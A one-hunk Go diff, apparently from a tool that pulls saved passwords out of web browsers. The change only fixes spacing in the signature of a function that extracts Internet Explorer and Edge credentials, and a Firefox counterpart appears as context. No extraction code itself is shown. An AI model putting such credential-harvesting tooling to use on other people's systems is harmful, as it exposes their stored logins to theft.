@@ -37,7 +37,7 @@ func ExtractFirefoxCredentials() common.ExtractCredentialsResult {
 }
 
 // Function that check saved credentials in internet explorer and edge
-func ExtractIECredentials()common.ExtractCredentialsResult {
+func ExtractIECredentials() common.ExtractCredentialsResult {
 	return browsers.InternetExplorerExtractDataRun()
 }
 
